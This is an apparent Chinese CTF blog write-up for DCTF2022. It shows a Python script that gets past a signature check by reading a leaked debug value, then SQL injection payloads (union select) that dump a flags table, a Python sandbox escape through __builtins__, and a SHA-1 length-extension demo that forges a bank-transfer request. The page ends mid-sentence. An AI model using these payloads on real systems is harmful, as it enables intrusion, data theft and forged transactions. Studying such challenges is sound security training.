@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这周准备期中考试，就做的少了点 DCTF2022sql tutor打开网页，得到一个sql查询网页，提供了有限的sql查询语句考虑是否可以自定义sql查询语句获得flag，存在范围超大的黑名单，屏蔽了绝大部分关键符号查看过滤过程抓包查看发现存在debug模式，查看debug和回显 123456789101112131415161718192021222324252627282930REQUEST">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4-20">
+<meta property="og:url" content="http://example.com/2022/04/18/4-20/index.html">
+<meta property="og:site_name" content="灵能对抗实验室">
+<meta property="og:description" content="这周准备期中考试，就做的少了点 DCTF2022sql tutor打开网页，得到一个sql查询网页，提供了有限的sql查询语句考虑是否可以自定义sql查询语句获得flag，存在范围超大的黑名单，屏蔽了绝大部分关键符号查看过滤过程抓包查看发现存在debug模式，查看debug和回显 123456789101112131415161718192021222324252627282930REQUEST">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5Cb56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C%E6%8D%95%E8%8E%B7.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C2.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C3.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C1.png">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5Csteg.png">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C4.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5C5.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5Ca.PNG">
+<meta property="og:image" content="http://example.com/2022/04/18/4-20/.%5Cc.PNG">
+<meta property="article:published_time" content="2022-04-18T10:45:37.000Z">
+<meta property="article:modified_time" content="2022-04-20T10:14:45.789Z">
+<meta property="article:author" content="hanbaiGG">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/18/4-20/.%5Cb56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg">
+
+<link rel="canonical" href="http://example.com/2022/04/18/4-20/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>4-20 | 灵能对抗实验室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">灵能对抗实验室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/18/4-20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          4-20
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-18 18:45:37" itemprop="dateCreated datePublished" datetime="2022-04-18T18:45:37+08:00">2022-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-20 18:14:45" itemprop="dateModified" datetime="2022-04-20T18:14:45+08:00">2022-04-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 这周准备期中考试，就做的少了点</p>
+<h1 id="DCTF2022"><a href="#DCTF2022" class="headerlink" title="DCTF2022"></a>DCTF2022</h1><h2 id="sql-tutor"><a href="#sql-tutor" class="headerlink" title="sql tutor"></a>sql tutor</h2><p>打开网页，得到一个sql查询网页，提供了有限的sql查询语句<br>考虑是否可以自定义sql查询语句获得flag，<br>存在范围超大的黑名单，屏蔽了绝大部分关键符号<br>查看过滤过程<br>抓包查看<br>发现存在debug模式，查看debug和回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">REQUEST</span><br><span class="line">POST /execute HTTP/2</span><br><span class="line"></span><br><span class="line">Host: sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">Origin: https://sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text=TWluYQ%3D%3D&amp;signature=502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&amp;queryNo=0&amp;debug=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RESPONSE</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;trimmedText&quot;:&quot;TWluYQ==&quot;,&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;alg&quot;:&quot;sha1&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Selected sha1 algorithm ✅&quot;,&quot;Decoded text from base64 ✅&quot;,&quot;Trimmed and checked the text ✅&quot;,&quot;Created signature: sha1(secret+sanitize(text)) ✅&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">REQUEST</span><br><span class="line">POST /verify_and_sign_text HTTP/2</span><br><span class="line"></span><br><span class="line">Host: sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">Origin: https://sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text=TWluYQ%3D%3D&amp;alg=sha1&amp;debug=1</span><br><span class="line"></span><br><span class="line">RESPONSE</span><br><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;text&quot;:&quot;TWluYSM=&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;8d6039b90ee87591d168d2955b2a67af7899ccb2 !== 502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>存在两个请求，第一个请求根据请求的字符串会构造一个sha1的编码，第二次请求时会再次构造一次编码，通过两次比对判断是否改变了字符串值，而黑名单过滤只存在与第一次请求中。<br><code>&quot;compare&quot;:&quot;8d6039b90ee87591d168d2955b2a67af7899ccb2 !== 502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;</code><br>因此可以构造解题路径<br>第一次携带非法数据请求<code>verify_and_sign_text</code>通过回显获得sha1的值，<br>再次请求该页面，通过第一次得到的sha1值通过检测<br>手工过于耗时，使用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url= &quot;https://sqltutor.dragonsec.si/execute&quot;</span><br><span class="line">payload =&quot;Mina&quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line">encoded=base64.b64encode(payload).decode(&#x27;utf-8&#x27;)</span><br><span class="line">data = &#123;</span><br><span class="line">&quot;text&quot;:encoded,</span><br><span class="line">&quot;signature&quot;:&quot;dummy&quot;,</span><br><span class="line">&quot;queryNo&quot;:&quot;0&quot;,</span><br><span class="line">&quot;debug&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r1= requests.post(url,data=data)</span><br><span class="line">print(r1.text)</span><br><span class="line">resp=r1.text</span><br><span class="line">signature= resp.split(&#x27;&quot;compare&quot;:&quot;&#x27;)[1][0:40]</span><br><span class="line"></span><br><span class="line">data[&quot;signature&quot;]=signature</span><br><span class="line">r2= requests.post(url,data=data)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;dummy&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e !== dummy&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;query&quot;:&quot;SELECT * FROM users WHERE users.name=&#x27;Mina&#x27;&quot;,&quot;results&quot;:[&#123;&quot;id&quot;:5,&quot;name&quot;:&quot;Mina&quot;,&quot;surname&quot;:&quot;Lang&quot;,&quot;age&quot;:29&#125;],&quot;description&quot;:&quot;This query selects all users with the name &#x27;Mina&#x27;.&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;,&quot;Confirmed text and signature match ✅&quot;,&quot;Executed query ✅&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;Mina&#x27; or 1=1#&quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;dummy&quot;,&quot;text&quot;:&quot;TWluYScgb3IgMT0xIw==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;114f7d67521c76794935ed8146367e62b19ef8bf !== dummy&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;query&quot;:&quot;SELECT * FROM users WHERE users.name=&#x27;Mina&#x27; or 1=1#&#x27;&quot;,&quot;results&quot;:[&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Branko&quot;,&quot;surname&quot;:&quot;Cakarmish&quot;,&quot;age&quot;:19&#125;,&#123;&quot;id&quot;:2,&quot;name&quot;:&quot;Lara&quot;,&quot;surname&quot;:&quot;Dragar&quot;,&quot;age&quot;:28&#125;,&#123;&quot;id&quot;:3,&quot;name&quot;:&quot;Lavon&quot;,&quot;surname&quot;:&quot;Tromp&quot;,&quot;age&quot;:18&#125;,&#123;&quot;id&quot;:4,&quot;name&quot;:&quot;Randal&quot;,&quot;surname&quot;:&quot;Jacobson&quot;,&quot;age&quot;:29&#125;,&#123;&quot;id&quot;:5,&quot;name&quot;:&quot;Mina&quot;,&quot;surname&quot;:&quot;Lang&quot;,&quot;age&quot;:29&#125;,&#123;&quot;id&quot;:6,&quot;name&quot;:&quot;Willis&quot;,&quot;surname&quot;:&quot;Little&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:7,&quot;name&quot;:&quot;Haley&quot;,&quot;surname&quot;:&quot;Boyle&quot;,&quot;age&quot;:51&#125;,&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;Serena&quot;,&quot;surname&quot;:&quot;Kuhic&quot;,&quot;age&quot;:21&#125;,&#123;&quot;id&quot;:9,&quot;name&quot;:&quot;Chance&quot;,&quot;surname&quot;:&quot;Doyle&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:10,&quot;name&quot;:&quot;Izaiah&quot;,&quot;surname&quot;:&quot;Kuvalis&quot;,&quot;age&quot;:19&#125;,&#123;&quot;id&quot;:11,&quot;name&quot;:&quot;Ramiro&quot;,&quot;surname&quot;:&quot;Sporer&quot;,&quot;age&quot;:21&#125;,&#123;&quot;id&quot;:12,&quot;name&quot;:&quot;Cleora&quot;,&quot;surname&quot;:&quot;Turner&quot;,&quot;age&quot;:38&#125;,&#123;&quot;id&quot;:13,&quot;name&quot;:&quot;Alexa&quot;,&quot;surname&quot;:&quot;Kovacek&quot;,&quot;age&quot;:47&#125;,&#123;&quot;id&quot;:14,&quot;name&quot;:&quot;Okey&quot;,&quot;surname&quot;:&quot;Kunze&quot;,&quot;age&quot;:53&#125;,&#123;&quot;id&quot;:15,&quot;name&quot;:&quot;Shane&quot;,&quot;surname&quot;:&quot;Walsh&quot;,&quot;age&quot;:46&#125;,&#123;&quot;id&quot;:16,&quot;name&quot;:&quot;Vanessa&quot;,&quot;surname&quot;:&quot;Reichel&quot;,&quot;age&quot;:31&#125;,&#123;&quot;id&quot;:17,&quot;name&quot;:&quot;Enrico&quot;,&quot;surname&quot;:&quot;Bernier&quot;,&quot;age&quot;:55&#125;,&#123;&quot;id&quot;:18,&quot;name&quot;:&quot;Maybelle&quot;,&quot;surname&quot;:&quot;Hickle&quot;,&quot;age&quot;:32&#125;,&#123;&quot;id&quot;:19,&quot;name&quot;:&quot;Garry&quot;,&quot;surname&quot;:&quot;Carter&quot;,&quot;age&quot;:37&#125;,&#123;&quot;id&quot;:20,&quot;name&quot;:&quot;Amanda&quot;,&quot;surname&quot;:&quot;Deckow&quot;,&quot;age&quot;:17&#125;,&#123;&quot;id&quot;:21,&quot;name&quot;:&quot;Aron&quot;,&quot;surname&quot;:&quot;Greenholt&quot;,&quot;age&quot;:34&#125;,&#123;&quot;id&quot;:22,&quot;name&quot;:&quot;Garrett&quot;,&quot;surname&quot;:&quot;Dubuque&quot;,&quot;age&quot;:41&#125;,&#123;&quot;id&quot;:23,&quot;name&quot;:&quot;Mozelle&quot;,&quot;surname&quot;:&quot;Schamberger&quot;,&quot;age&quot;:45&#125;,&#123;&quot;id&quot;:24,&quot;name&quot;:&quot;Arno&quot;,&quot;surname&quot;:&quot;Mckenzie&quot;,&quot;age&quot;:25&#125;,&#123;&quot;id&quot;:25,&quot;name&quot;:&quot;Claudie&quot;,&quot;surname&quot;:&quot;Lowe&quot;,&quot;age&quot;:17&#125;,&#123;&quot;id&quot;:26,&quot;name&quot;:&quot;Janice&quot;,&quot;surname&quot;:&quot;Bogisich&quot;,&quot;age&quot;:30&#125;,&#123;&quot;id&quot;:27,&quot;name&quot;:&quot;Kenneth&quot;,&quot;surname&quot;:&quot;Dicki&quot;,&quot;age&quot;:47&#125;],&quot;description&quot;:&quot;This query selects all users with the name &#x27;Mina&#x27; or 1=1#&#x27;.&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;114f7d67521c76794935ed8146367e62b19ef8bf&quot;,&quot;text&quot;:&quot;TWluYScgb3IgMT0xIw==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;,&quot;Confirmed text and signature match ✅&quot;,&quot;Executed query ✅&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>成功绕过过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;&#x27;union select 1,2,3,4 from users# &quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;2&quot;,&quot;surname&quot;:&quot;3&quot;,&quot;age&quot;:4&#125;</span><br></pre></td></tr></table></figure>
+<p>得到存在4个字段，回显点为4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =&quot;&#x27;union select 1,2,3,version()# &quot;.encode(&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure>
+<p>成功回显，按照正常sql注入流程注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到表名</span><br><span class="line">age&quot;:&quot;cars,flags,users&quot;</span><br></pre></td></tr></table></figure>
+<p>得到字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,id</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,flag from flags #</span><br></pre></td></tr></table></figure>
+<h2 id="SAFE-SPACE"><a href="#SAFE-SPACE" class="headerlink" title="SAFE SPACE"></a>SAFE SPACE</h2><p>题目提供了端口，访问端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 51.124.222.205 13379</span><br></pre></td></tr></table></figure>
+<p>python sandbox escape问题，禁用了很多函数，但自带的<code>__builtins__</code>能够使用，使用内置list索引访问绕过过滤，获得flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;__builtins__</span><br><span class="line">&#123;&#x27;open&#x27;: &lt;built-in function open&gt;, &#x27;print&#x27;: &lt;built-in function print&gt;, &#x27;list&#x27;: &lt;class &#x27;list&#x27;&gt;, &#x27;FILE&#x27;: &#x27;flag.txt&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt;FILE</span><br><span class="line">flag.txt</span><br><span class="line">&gt;&gt;&gt;open(FILE).read()</span><br><span class="line">Yeah no.</span><br><span class="line">&gt;&gt;&gt;list(__builtins__.values())[0](FILE).read()</span><br><span class="line">dctf&#123;bur5t_y0ur_bubbl3&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="sha-1利用demo"><a href="#sha-1利用demo" class="headerlink" title="sha-1利用demo"></a>sha-1利用demo</h1><p>api接口参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from=123&amp;to=456&amp;amount=50</span><br></pre></td></tr></table></figure>
+<p>服务器检测函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$salt = &quot;s3cRe7-#!@~&quot;;</span><br><span class="line">$signature = sha1($salt.$msg);</span><br><span class="line">if($signature == $x_signature_header) &#123; // sent as an HTTP header</span><br><span class="line">	// correct</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	// discard message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务器生成hash生成函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* PHP */</span><br><span class="line">$salt = &quot;s3cRe7-#!@~&quot;;</span><br><span class="line">$msg = urldecode($_SERVER[&#x27;QUERY_STRING&#x27;]); // read input.</span><br><span class="line"></span><br><span class="line">$signature = sha1($salt . $msg);    // compute signature.</span><br></pre></td></tr></table></figure>
+<p>传递的信息加在salt后进行hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">73 33 63 52 65 37 2d 23 21 40 7e 66 72 6f 6d 3d    s3cRe7-#!@~from=</span><br><span class="line">31 32 33 26 74 6f 3d 34 35 36 26 61 6d 6f 75 6e    123&amp;to=456&amp;amoun</span><br><span class="line">74 3d 35 30 80 00 00 00 00 00 00 00 00 00 00 00     t=50............</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 20     ............... </span><br></pre></td></tr></table></figure>
+<p>假设我们得知了salt的长度，就可以获得恶意代码的hash值注入到服务器中。<br>sha1的最后两字节是块中字符的长度，我们构造第二个数据块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">26 74 6f 3d 36 36 36 26 61 6d 6f 75 6e 74 3d 39    &amp;to=666&amp;amount=9</span><br><span class="line">39 39 39 39 80 00 00 00 00 00 00 00 00 00 00 00    9999............</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 a0    ................</span><br></pre></td></tr></table></figure>
+<p>第一个数据块使用固定的初始字符组加密，</p>
